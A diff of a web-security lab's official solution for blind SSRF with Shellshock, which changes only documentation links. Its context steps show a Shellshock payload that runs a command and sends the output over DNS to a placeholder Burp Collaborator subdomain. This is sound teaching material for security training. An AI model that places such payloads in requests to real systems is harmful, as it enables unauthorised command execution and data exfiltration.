@@ -52,13 +52,13 @@ To prevent the Academy platform being used to attack third parties, our firewall
 <details><summary>Official solution</summary>
 
 1. In Burp Suite Professional, install the Collaborator Everywhere extension from the BApp Store.
-2. Add the domain of the lab to Burp Suite's [target scope](/burp/documentation/desktop/tools/target/scope), so that Collaborator Everywhere will target it.
+2. Add the domain of the lab to Burp Suite's [target scope](https://portswigger.net/burp/documentation/desktop/tools/target/scope), so that Collaborator Everywhere will target it.
 3. Browse the site.
 4. Observe that when you load a product page, it triggers an HTTP interaction with Burp Collaborator, via the
    `Referer` header.
 5. Observe that the HTTP interaction contains your `User-Agent` string within the HTTP request.
 6. Send the request to the product page to Burp Intruder.
-7. Go to the  [Collaborator](/burp/documentation/desktop/tools/collaborator)  tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
+7. Go to the  [Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator)  tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
 
    `() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
 8. Replace the `User-Agent` string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
